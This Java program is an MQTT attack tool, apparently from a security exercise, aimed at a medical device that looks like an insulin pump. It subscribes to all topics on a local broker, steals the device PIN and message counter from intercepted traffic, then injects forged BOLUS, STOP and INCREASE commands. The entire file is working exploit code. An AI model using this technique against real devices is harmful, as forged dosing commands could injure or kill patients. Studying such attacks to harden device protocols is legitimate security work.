import org.eclipse.paho.client.mqttv3.*;
import java.util.UUID;
import MQTT.Message;
import MQTT.CRC12;

public class ActiveAttacker {

    private static final String BROKER = "tcp://localhost:1883";
    private static final String ATTACKER_ID = "ActiveAttacker";

    private static String learnedTopic = null;
    private static UUID learnedPin = null;
    private static int learnedCounter = 0;
    private static boolean attackLaunched = false;

    public static void main(String[] args) throws MqttException, InterruptedException {

        MqttClient client = new MqttClient(BROKER, ATTACKER_ID);
        MqttConnectOptions options = new MqttConnectOptions();
        options.setCleanSession(true);
        client.connect(options);

        System.out.println("[ATTACKER] Connected to broker.");
        System.out.println("[ATTACKER] Listening for legitimate traffic...");

        client.subscribe("#", (topic, mqttMessage) -> {
            String raw = new String(mqttMessage.getPayload());

            try {
                Message msg = Message.deserialize(raw);

                if (!msg.isValid()) {
                    return;
                }

                learnedPin = msg.devicePin;
                learnedCounter = msg.counter + 1;
                learnedTopic = topic;

                System.out.println("====================");
                System.out.println("[INTERCEPTED]");
                System.out.println("TOPIC: " + topic);
                System.out.println("PAYLOAD: " + raw);
                System.out.println("====================");

                if (learnedPin != null && learnedTopic != null && !attackLaunched) {
                    attackLaunched = true;
                    new Thread(() -> {
                        try {
                            Thread.sleep(1000);
                            System.out.println("====================");
                            System.out.println("[ATTACKER] PIN learned: " + learnedPin);
                            System.out.println("[ATTACKER] Launching active attack on topic: " + learnedTopic);
                            System.out.println("====================");
                            launchAttack(client, "BOLUS");
                            Thread.sleep(1000);
                            launchAttack(client, "STOP");
                            Thread.sleep(1000);
                            launchAttack(client, "INCREASE");
                            System.out.println("====================");
                            System.out.println("[ATTACKER] Attack complete. Disconnected.");
                            System.out.println("====================");
                            client.disconnect();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }).start();
                }

            } catch (Exception e) {
                // silently ignore unparseable messages
            }
        });

        while (!attackLaunched || client.isConnected()) {
            Thread.sleep(500);
        }
    }

    private static void launchAttack(MqttClient client, String command) throws MqttException {
        Message malicious = new Message(
            "remote",
            learnedPin,
            "command",
            command,
            learnedCounter++
        );

        String serialized = malicious.serialize();
        MqttMessage mqttMessage = new MqttMessage(serialized.getBytes());
        mqttMessage.setQos(1);

        client.publish(learnedTopic, mqttMessage);

        System.out.println("====================");
        System.out.println("[INJECTED]");
        System.out.println("TOPIC: " + learnedTopic);
        System.out.println("PAYLOAD: " + serialized);
        System.out.println("====================");
    }
}